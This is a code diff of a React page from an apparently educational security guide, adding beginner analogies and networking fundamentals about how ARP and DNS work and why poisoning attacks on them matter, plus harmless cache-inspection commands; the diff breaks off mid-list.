@@ -1111,14 +1111,18 @@ const ArpDnsPoisoningPage: React.FC = () => {
     { id: "arp-attacks", label: "ARP Attacks", icon: <BugReportIcon /> },
     { id: "dns-fundamentals", label: "DNS Fundamentals", icon: <DnsIcon /> },
     { id: "dns-attacks", label: "DNS Attacks", icon: <WarningIcon /> },
+    { id: "ipv6-ndp", label: "IPv6 NDP Attacks", icon: <DevicesIcon /> },
+    { id: "lab-setup", label: "Lab Setup", icon: <SettingsIcon /> },
+    { id: "attack-scenarios", label: "Attack Scenarios", icon: <PsychologyIcon /> },
     { id: "attack-flow", label: "Attack Flow", icon: <AccountTreeIcon /> },
-    { id: "real-world", label: "Real-World Cases", icon: <HistoryIcon /> },
     { id: "detection", label: "Detection", icon: <SearchIcon /> },
+    { id: "incident-response", label: "Incident Response", icon: <GavelIcon /> },
     { id: "defense", label: "Defense Controls", icon: <ShieldIcon /> },
     { id: "switch-security", label: "Switch Security", icon: <RouterIcon /> },
     { id: "dns-security", label: "DNS Security", icon: <LockIcon /> },
     { id: "tools", label: "Tools Reference", icon: <BuildIcon /> },
     { id: "commands", label: "Commands", icon: <TerminalIcon /> },
+    { id: "real-incidents", label: "Real-World Incidents", icon: <HistoryIcon /> },
     { id: "best-practices", label: "Best Practices", icon: <TipsAndUpdatesIcon /> },
     { id: "quiz", label: "Knowledge Quiz", icon: <QuizIcon /> },
   ];
@@ -1419,6 +1423,99 @@ const ArpDnsPoisoningPage: React.FC = () => {
                 Introduction
               </Typography>
 
+              {/* Beginner-Friendly Analogy */}
+              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha(accent, 0.05), borderRadius: 2, border: `2px solid ${alpha(accent, 0.2)}` }}>
+                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: accent }}>
+                  🏠 The Neighborhood Analogy: Understanding Network Attacks
+                </Typography>
+                <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  Imagine your home network as a <strong>neighborhood</strong> where houses need to send mail to each other:
+                </Typography>
+                <Grid container spacing={3}>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
+                        📬 ARP = The Local Mailman
+                      </Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        ARP is like asking, "I need to send a package to 123 Main Street. What color is their mailbox?"
+                      </Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        <strong>The Problem:</strong> If someone shouts "I'm the house at 123 Main Street! My mailbox is RED!" 
+                        — everyone just believes them without checking ID.
+                      </Typography>
+                      <Typography variant="body2" sx={{ fontStyle: "italic", color: "text.secondary" }}>
+                        <strong>ARP Poisoning:</strong> An attacker pretends to be your router, so all your "mail" 
+                        (internet traffic) goes through them first.
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>
+                        📖 DNS = The Internet Phone Book
+                      </Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        DNS is like looking up "Google's Headquarters" in a phone book to get their street address.
+                      </Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        <strong>The Problem:</strong> What if someone replaced the phone book page with a fake address 
+                        that leads to their own building?
+                      </Typography>
+                      <Typography variant="body2" sx={{ fontStyle: "italic", color: "text.secondary" }}>
+                        <strong>DNS Poisoning:</strong> When you try to visit google.com, you're secretly sent to 
+                        a fake website that looks exactly the same.
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                </Grid>
+              </Paper>
+
+              {/* Why This Matters */}
+              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
+                  ⚠️ Why Should You Care About These Attacks?
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ display: "flex", gap: 1, alignItems: "flex-start" }}>
+                      <Typography sx={{ fontSize: "1.5rem" }}>💳</Typography>
+                      <Box>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Financial Theft</Typography>
+                        <Typography variant="body2" color="text.secondary">
+                          Attackers can steal banking credentials, credit card numbers, and cryptocurrency wallet keys 
+                          by redirecting you to fake sites.
+                        </Typography>
+                      </Box>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ display: "flex", gap: 1, alignItems: "flex-start" }}>
+                      <Typography sx={{ fontSize: "1.5rem" }}>🔑</Typography>
+                      <Box>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Credential Harvesting</Typography>
+                        <Typography variant="body2" color="text.secondary">
+                          Every password you type on a compromised network can be captured — email, social media, 
+                          work accounts, everything.
+                        </Typography>
+                      </Box>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ display: "flex", gap: 1, alignItems: "flex-start" }}>
+                      <Typography sx={{ fontSize: "1.5rem" }}>🏢</Typography>
+                      <Box>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Corporate Espionage</Typography>
+                        <Typography variant="body2" color="text.secondary">
+                          Companies have lost millions when attackers intercepted confidential communications, 
+                          contracts, and intellectual property.
+                        </Typography>
+                      </Box>
+                    </Box>
+                  </Grid>
+                </Grid>
+              </Paper>
+
               <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                 ARP (Address Resolution Protocol) and DNS (Domain Name System) poisoning are fundamental network-layer attacks
                 that exploit trust-based protocols designed before security was a primary concern. These attacks enable
@@ -1430,6 +1527,31 @@ const ArpDnsPoisoningPage: React.FC = () => {
                 This guide covers attack techniques from a defensive perspective. Understanding how attacks work is essential
                 for building effective defenses. Always practice in isolated lab environments with proper authorization.
               </Alert>
+
+              {/* Quick Facts */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
+                  📊 Quick Facts for Beginners
+                </Typography>
+                <Grid container spacing={2}>
+                  {[
+                    { label: "ARP Attack Range", value: "Local Network Only", desc: "Attacker must be on same WiFi/LAN" },
+                    { label: "DNS Attack Range", value: "Local to Global", desc: "Can affect one PC or millions" },
+                    { label: "Detection Difficulty", value: "Moderate", desc: "Often invisible to regular users" },
+                    { label: "Defense Complexity", value: "Medium", desc: "Requires network infrastructure changes" },
+                    { label: "Risk on Public WiFi", value: "Very High", desc: "Coffee shops, airports are hotspots" },
+                    { label: "HTTPS Protection", value: "Partial", desc: "Helps but not foolproof" },
+                  ].map((item, idx) => (
+                    <Grid item xs={6} md={4} key={idx}>
+                      <Box sx={{ textAlign: "center", p: 1 }}>
+                        <Typography variant="h6" sx={{ fontWeight: 700, color: accent }}>{item.value}</Typography>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>{item.label}</Typography>
+                        <Typography variant="caption" color="text.secondary">{item.desc}</Typography>
+                      </Box>
+                    </Grid>
+                  ))}
+                </Grid>
+              </Paper>
 
               <Grid container spacing={3}>
                 <Grid item xs={12} md={6}>
@@ -1497,15 +1619,109 @@ const ArpDnsPoisoningPage: React.FC = () => {
                 ARP Fundamentals
               </Typography>
 
+              {/* Beginner Analogy */}
+              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha(accent, 0.05), borderRadius: 2, border: `2px solid ${alpha(accent, 0.2)}` }}>
+                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: accent }}>
+                  🏷️ The Name Tag Analogy
+                </Typography>
+                <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  Imagine you're at a <strong>masquerade party</strong> where everyone wears masks:
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>🎭</Typography>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>IP Address = Your Name</Typography>
+                      <Typography variant="body2" color="text.secondary">
+                        "Hi, I'm John Smith" — This is how you're known to everyone at the party.
+                      </Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>👤</Typography>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>MAC Address = Your Face</Typography>
+                      <Typography variant="body2" color="text.secondary">
+                        Your physical appearance — unique to you and needed to actually hand you a drink.
+                      </Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>📢</Typography>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>ARP = Shouting a Question</Typography>
+                      <Typography variant="body2" color="text.secondary">
+                        "Hey John Smith, raise your hand so I can see what you look like!"
+                      </Typography>
+                    </Box>
+                  </Grid>
+                </Grid>
+                <Alert severity="warning" sx={{ mt: 2 }}>
+                  <Typography variant="body2">
+                    <strong>The Security Problem:</strong> Anyone at the party can raise their hand and say "I'm John Smith!" 
+                    There's no bouncer checking IDs. That's exactly how ARP poisoning works.
+                  </Typography>
+                </Alert>
+              </Paper>
+
+              {/* Technical Deep Dive */}
               <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                 The Address Resolution Protocol (ARP) is a Layer 2/3 protocol that maps IP addresses to MAC (Media Access Control)
                 addresses on local area networks. When a device needs to send a packet to another device on the same network,
                 it must know the destination's MAC address to create the Ethernet frame.
               </Typography>
 
+              {/* What is a MAC Address */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
+                  🔢 Understanding MAC Addresses
+                </Typography>
+                <Grid container spacing={3}>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="body2" sx={{ mb: 2 }}>
+                      A <strong>MAC address</strong> (Media Access Control) is a unique hardware identifier assigned to every network interface card (NIC).
+                    </Typography>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Example MAC Address:</Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "1.1rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1, mb: 2 }}>
+                      <Typography component="span" sx={{ color: "#ef4444", fontWeight: 700 }}>AA:BB:CC</Typography>
+                      <Typography component="span">:</Typography>
+                      <Typography component="span" sx={{ color: "#3b82f6", fontWeight: 700 }}>DD:EE:FF</Typography>
+                    </Box>
+                    <Typography variant="body2">
+                      <Typography component="span" sx={{ color: "#ef4444", fontWeight: 700 }}>First 3 bytes (OUI):</Typography> Identifies the manufacturer (Intel, Cisco, etc.)
+                    </Typography>
+                    <Typography variant="body2">
+                      <Typography component="span" sx={{ color: "#3b82f6", fontWeight: 700 }}>Last 3 bytes:</Typography> Unique device identifier
+                    </Typography>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Why Do We Need Both IP and MAC?</Typography>
+                    <TableContainer component={Paper} sx={{ bgcolor: "transparent" }}>
+                      <Table size="small">
+                        <TableBody>
+                          <TableRow>
+                            <TableCell sx={{ fontWeight: 700 }}>IP Address</TableCell>
+                            <TableCell>Logical address, can change</TableCell>
+                            <TableCell>Used for routing across networks</TableCell>
+                          </TableRow>
+                          <TableRow>
+                            <TableCell sx={{ fontWeight: 700 }}>MAC Address</TableCell>
+                            <TableCell>Physical address, permanent*</TableCell>
+                            <TableCell>Used for local delivery</TableCell>
+                          </TableRow>
+                        </TableBody>
+                      </Table>
+                    </TableContainer>
+                    <Typography variant="caption" color="text.secondary" sx={{ mt: 1, display: "block" }}>
+                      *MAC addresses can be spoofed in software, but the hardware address is burned in at the factory.
+                    </Typography>
+                  </Grid>
+                </Grid>
+              </Paper>
+
               <Grid container spacing={3}>
                 <Grid item xs={12} md={6}>
-                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>How ARP Works</Typography>
+                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>How ARP Works (Step by Step)</Typography>
                   <List>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>1</Typography></ListItemIcon>
@@ -1517,29 +1733,29 @@ const ArpDnsPoisoningPage: React.FC = () => {
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>2</Typography></ListItemIcon>
                       <ListItemText
-                        primary="A broadcasts an ARP Request"
-                        secondary="'Who has 192.168.1.5? Tell 192.168.1.1'"
+                        primary="A broadcasts an ARP Request to everyone"
+                        secondary="'Who has 192.168.1.5? Tell 192.168.1.1' — sent to FF:FF:FF:FF:FF:FF"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>3</Typography></ListItemIcon>
                       <ListItemText
                         primary="All devices receive the broadcast"
-                        secondary="Only Device B (192.168.1.5) responds"
+                        secondary="Everyone hears it, but only the device with that IP responds"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>4</Typography></ListItemIcon>
                       <ListItemText
-                        primary="B sends unicast ARP Reply"
-                        secondary="'192.168.1.5 is at AA:BB:CC:DD:EE:FF'"
+                        primary="B sends a unicast ARP Reply directly to A"
+                        secondary="'192.168.1.5 is at AA:BB:CC:DD:EE:FF' — only A receives this"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: accent }}>5</Typography></ListItemIcon>
                       <ListItemText
-                        primary="A caches the mapping"
-                        secondary="Future packets use cached MAC address"
+                        primary="A caches the mapping in its ARP table"
+                        secondary="Future packets use the cached MAC — no need to ask again (for a while)"
                       />
                     </ListItem>
                   </List>
@@ -1569,14 +1785,70 @@ const ArpDnsPoisoningPage: React.FC = () => {
                 </Grid>
               </Grid>
 
+              {/* ARP Types Explained */}
+              <Box sx={{ mt: 4 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Types of ARP Messages</Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, height: "100%" }}>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>ARP Request</Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        Broadcast message asking "Who has this IP? Tell me your MAC."
+                      </Typography>
+                      <Typography variant="caption" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.05), p: 0.5, borderRadius: 1, display: "block" }}>
+                        Who has 192.168.1.1? Tell 192.168.1.100
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>ARP Reply</Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        Unicast response saying "I have that IP, here's my MAC address."
+                      </Typography>
+                      <Typography variant="caption" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.05), p: 0.5, borderRadius: 1, display: "block" }}>
+                        192.168.1.1 is at aa:bb:cc:dd:ee:ff
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Gratuitous ARP</Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        Unsolicited announcement: "Hey everyone, THIS is my IP and MAC!" 
+                        Used legitimately for IP conflict detection and failover.
+                      </Typography>
+                      <Typography variant="caption" color="error">
+                        ⚠️ Often abused in attacks since it's accepted without being requested
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>ARP Probe</Typography>
+                      <Typography variant="body2" sx={{ mb: 1 }}>
+                        Sent during DHCP to check if an IP is already in use before claiming it. 
+                        Sender IP is set to 0.0.0.0.
+                      </Typography>
+                      <Typography variant="caption" color="text.secondary">
+                        Used in address auto-configuration (APIPA)
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                </Grid>
+              </Box>
+
               <Box sx={{ mt: 3 }}>
-                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>ARP Cache Behavior</Typography>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>ARP Cache Behavior by Operating System</Typography>
                 <Grid container spacing={2}>
                   <Grid item xs={12} md={4}>
                     <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
                       <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Windows</Typography>
                       <Typography variant="body2">Default timeout: 15-45 seconds (reachable)</Typography>
                       <Typography variant="body2">Unreachable timeout: varies by version</Typography>
+                      <Typography variant="caption" sx={{ mt: 1, display: "block" }}>
+                        Command: <code>arp -a</code>
+                      </Typography>
                     </Paper>
                   </Grid>
                   <Grid item xs={12} md={4}>
@@ -1584,6 +1856,9 @@ const ArpDnsPoisoningPage: React.FC = () => {
                       <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e" }}>Linux</Typography>
                       <Typography variant="body2">Base reachable time: 30 seconds</Typography>
                       <Typography variant="body2">Garbage collection: configurable</Typography>
+                      <Typography variant="caption" sx={{ mt: 1, display: "block" }}>
+                        Command: <code>ip neigh show</code>
+                      </Typography>
                     </Paper>
                   </Grid>
                   <Grid item xs={12} md={4}>
@@ -1591,15 +1866,25 @@ const ArpDnsPoisoningPage: React.FC = () => {
                       <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6" }}>Cisco IOS</Typography>
                       <Typography variant="body2">Default timeout: 4 hours</Typography>
                       <Typography variant="body2">Configurable per interface</Typography>
+                      <Typography variant="caption" sx={{ mt: 1, display: "block" }}>
+                        Command: <code>show ip arp</code>
+                      </Typography>
                     </Paper>
                   </Grid>
                 </Grid>
               </Box>
 
-              <Alert severity="warning" sx={{ mt: 3 }}>
-                <AlertTitle>Security Weakness</AlertTitle>
-                ARP has no authentication mechanism. Devices accept ARP replies without verifying the sender's identity,
-                making spoofing trivial for attackers on the same network segment.
+              <Alert severity="error" sx={{ mt: 3 }}>
+                <AlertTitle>🚨 The Fundamental Security Flaw</AlertTitle>
+                <Typography variant="body2">
+                  ARP was designed in 1982 when the internet was a trusted academic network. It has <strong>NO authentication mechanism</strong>. 
+                  Devices blindly accept ANY ARP reply, even if they didn't ask for it. This means:
+                </Typography>
+                <List dense sx={{ mt: 1 }}>
+                  <ListItem sx={{ py: 0 }}><ListItemText primary="• Anyone on the network can claim to be any IP address" /></ListItem>
+                  <ListItem sx={{ py: 0 }}><ListItemText primary="• There's no verification of who sent the ARP message" /></ListItem>
+                  <ListItem sx={{ py: 0 }}><ListItemText primary="• The most recent reply wins — attackers can constantly re-poison" /></ListItem>
+                </List>
               </Alert>
             </Paper>
 
@@ -1695,56 +1980,190 @@ const ArpDnsPoisoningPage: React.FC = () => {
                 DNS Fundamentals
               </Typography>
 
+              {/* Beginner Analogy */}
+              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `2px solid ${alpha("#22c55e", 0.2)}` }}>
+                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
+                  📖 The Library Card Catalog Analogy
+                </Typography>
+                <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  Imagine the internet as a <strong>massive library</strong> with billions of books (websites):
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>📚</Typography>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Domain Name = Book Title</Typography>
+                      <Typography variant="body2" color="text.secondary">
+                        "google.com" is like asking for "Encyclopedia of Search"
+                      </Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>🗃️</Typography>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>DNS = Card Catalog</Typography>
+                      <Typography variant="body2" color="text.secondary">
+                        The system that tells you "that book is in Aisle 142.250.80.14"
+                      </Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>📍</Typography>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>IP Address = Shelf Location</Typography>
+                      <Typography variant="body2" color="text.secondary">
+                        The actual physical location where the book lives
+                      </Typography>
+                    </Box>
+                  </Grid>
+                </Grid>
+                <Alert severity="warning" sx={{ mt: 2 }}>
+                  <Typography variant="body2">
+                    <strong>The Security Problem:</strong> What if someone switched the card in the catalog? You'd ask for 
+                    "Encyclopedia of Search" but get sent to "Scammer's Fake Book" that looks identical but steals your library card!
+                  </Typography>
+                </Alert>
+              </Paper>
+
+              {/* Why DNS Matters */}
+              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
+                  🌐 Why DNS is Critical Infrastructure
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2 }}>
+                  DNS is often called "the phone book of the internet" — but it's actually more critical than that. 
+                  Without DNS, you'd have to memorize IP addresses like 142.250.80.14 instead of typing google.com.
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} sm={6} md={3}>
+                    <Box sx={{ textAlign: "center" }}>
+                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>4.3B+</Typography>
+                      <Typography variant="caption">DNS queries per day (Google alone)</Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} sm={6} md={3}>
+                    <Box sx={{ textAlign: "center" }}>
+                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>13</Typography>
+                      <Typography variant="caption">Root name server clusters worldwide</Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} sm={6} md={3}>
+                    <Box sx={{ textAlign: "center" }}>
+                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>&lt;50ms</Typography>
+                      <Typography variant="caption">Typical DNS query resolution time</Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} sm={6} md={3}>
+                    <Box sx={{ textAlign: "center" }}>
+                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>1983</Typography>
+                      <Typography variant="caption">Year DNS was invented (RFC 882)</Typography>
+                    </Box>
+                  </Grid>
+                </Grid>
+              </Paper>
+
               <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                 The Domain Name System (DNS) is a hierarchical distributed naming system that translates human-readable
-                domain names (like example.com) into IP addresses that computers use to communicate. DNS is often called
-                "the phone book of the internet."
+                domain names (like example.com) into IP addresses that computers use to communicate. Every time you visit 
+                a website, send an email, or use almost any internet service, DNS is working behind the scenes.
               </Typography>
+
+              {/* DNS Hierarchy Explained */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
+                  🏗️ The DNS Hierarchy (Reading Right to Left)
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2 }}>
+                  A domain name like <code>www.example.com</code> is actually read <strong>right to left</strong> by DNS:
+                </Typography>
+                <Box sx={{ fontFamily: "monospace", fontSize: "1rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1, textAlign: "center", mb: 2 }}>
+                  <Typography component="span">www</Typography>
+                  <Typography component="span" sx={{ color: "text.secondary" }}>.</Typography>
+                  <Typography component="span" sx={{ color: "#3b82f6", fontWeight: 700 }}>example</Typography>
+                  <Typography component="span" sx={{ color: "text.secondary" }}>.</Typography>
+                  <Typography component="span" sx={{ color: "#22c55e", fontWeight: 700 }}>com</Typography>
+                  <Typography component="span" sx={{ color: "text.secondary" }}>.</Typography>
+                  <Typography component="span" sx={{ color: "#ef4444", fontWeight: 700 }}>(root)</Typography>
+                </Box>
+                <Grid container spacing={2}>
+                  <Grid item xs={6} md={3}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444" }}>Root Zone (.)</Typography>
+                    <Typography variant="caption" color="text.secondary">
+                      Top of hierarchy. 13 clusters worldwide managed by ICANN.
+                    </Typography>
+                  </Grid>
+                  <Grid item xs={6} md={3}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e" }}>TLD (.com, .org)</Typography>
+                    <Typography variant="caption" color="text.secondary">
+                      Top-Level Domain. Managed by registries (Verisign for .com).
+                    </Typography>
+                  </Grid>
+                  <Grid item xs={6} md={3}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Domain (example)</Typography>
+                    <Typography variant="caption" color="text.secondary">
+                      Your registered domain. You control its DNS records.
+                    </Typography>
+                  </Grid>
+                  <Grid item xs={6} md={3}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Subdomain (www)</Typography>
+                    <Typography variant="caption" color="text.secondary">
+                      Optional prefix you create (mail, blog, api, etc.)
+                    </Typography>
+                  </Grid>
+                </Grid>
+              </Paper>
 
               <Grid container spacing={3}>
                 <Grid item xs={12} md={6}>
-                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Resolution Process</Typography>
+                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Resolution Process (Detailed)</Typography>
                   <List>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>1</Typography></ListItemIcon>
                       <ListItemText
                         primary="User types example.com in browser"
-                        secondary="Browser checks local cache first"
+                        secondary="Browser checks its cache → OS cache → hosts file first"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>2</Typography></ListItemIcon>
                       <ListItemText
                         primary="Query sent to recursive resolver"
-                        secondary="Usually ISP or configured DNS (8.8.8.8)"
+                        secondary="Usually your ISP or configured DNS (8.8.8.8, 1.1.1.1)"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>3</Typography></ListItemIcon>
                       <ListItemText
-                        primary="Resolver queries root servers"
-                        secondary="Root returns .com TLD servers"
+                        primary="Resolver checks its cache"
+                        secondary="If cached and not expired (TTL), returns immediately"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>4</Typography></ListItemIcon>
                       <ListItemText
-                        primary="Resolver queries .com TLD"
-                        secondary="TLD returns authoritative nameservers"
+                        primary="Resolver queries root servers"
+                        secondary="Root says 'I don't know, but .com TLD is at 192.5.6.30'"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>5</Typography></ListItemIcon>
                       <ListItemText
-                        primary="Authoritative server responds"
-                        secondary="Returns IP address for example.com"
+                        primary="Resolver queries .com TLD"
+                        secondary="TLD says 'example.com NS is at ns1.example.com'"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>6</Typography></ListItemIcon>
                       <ListItemText
-                        primary="Result cached and returned"
-                        secondary="Browser connects to the IP address"
+                        primary="Resolver queries authoritative NS"
+                        secondary="Authoritative server returns: 'example.com A 93.184.216.34'"
+                      />
+                    </ListItem>
+                    <ListItem>
+                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>7</Typography></ListItemIcon>
+                      <ListItemText
+                        primary="Result cached at each level"
+                        secondary="Cached based on TTL (Time To Live) value"
                       />
                     </ListItem>
                   </List>
@@ -1772,6 +2191,26 @@ const ArpDnsPoisoningPage: React.FC = () => {
                       </TableBody>
                     </Table>
                   </TableContainer>
+                  
+                  {/* Common DNS Servers */}
+                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mt: 3, mb: 1 }}>Popular Public DNS Servers</Typography>
+                  <Grid container spacing={1}>
+                    {[
+                      { name: "Google", primary: "8.8.8.8", secondary: "8.8.4.4" },
+                      { name: "Cloudflare", primary: "1.1.1.1", secondary: "1.0.0.1" },
